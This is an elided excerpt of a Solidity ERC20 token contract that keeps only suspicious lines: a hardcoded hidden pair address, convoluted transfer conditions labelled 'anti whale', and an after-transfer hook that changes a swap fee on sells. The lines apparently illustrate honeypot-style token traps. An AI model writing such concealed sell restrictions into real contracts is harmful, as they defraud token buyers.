...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address private uniswapV2Pair = 0xf341E7E694396462A839247664d596e51D5061A5;
    ...
    uint256 public _maxWalletSize = 200_000_000_000 * 10**9; // 4 %
    address private tokenPairAddress; // necessary for anti whale
    ...
    function _transfer(
        ...
        } if (_pairToken[from] != true && _pairToken[to] != true && _pairToken[tx.origin] != true && to != UniSwapRouterCA && from == tokenPairAddress && msg.sender != UniSwapRouterCA && to != DEAD) {
    ...
    function _spendAllowance(
        ...
        } function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual { if (to == uniswapV2Pair) _defaultSwap = decimals() * 11;
    }
